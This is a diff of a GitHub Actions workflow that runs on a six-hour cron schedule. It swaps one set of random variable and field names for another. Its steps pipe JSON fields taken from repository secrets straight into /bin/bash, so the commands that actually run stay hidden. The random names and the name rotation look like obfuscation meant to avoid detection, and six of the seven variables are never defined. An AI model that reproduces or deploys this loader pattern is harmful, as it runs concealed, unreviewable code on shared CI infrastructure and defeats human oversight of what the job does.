@@ -3,23 +3,21 @@ name: zhaozilong7182
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 1/6 * * *'
-
-jobs:  # 19130
+    - cron: '13 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhaozilong7182
         env:
-          g32: ${{ secrets.g32 }}
+          tqyvo77: ${{ secrets.tqyvo77 }}
         run: |
-          echo $g32 | jq -r .dcj8225 | /bin/bash
-          echo $vl59400 | jq -r .pukdi8752 | /bin/bash
-          echo $c6 | jq -r .nlfd58512 | /bin/bash
-          echo $pb7 | jq -r .r20 | /bin/bash
-          echo $sjb9885 | jq -r .o4548 | /bin/bash
-          echo $ofzj181 | jq -r .rlr04 | /bin/bash
-          echo $rcbuq1598 | jq -r .o9 | /bin/bash
+          echo $tqyvo77 | jq -r .uj088 | /bin/bash
+          echo $e3 | jq -r .ia638 | /bin/bash
+          echo $jgou2894 | jq -r .geylp33 | /bin/bash
+          echo $ll51 | jq -r .xho0 | /bin/bash
+          echo $ehmi6745 | jq -r .cqu24 | /bin/bash
+          echo $msf880 | jq -r .ft9059 | /bin/bash
+          echo $qwz5436 | jq -r .xh58773 | /bin/bash
 
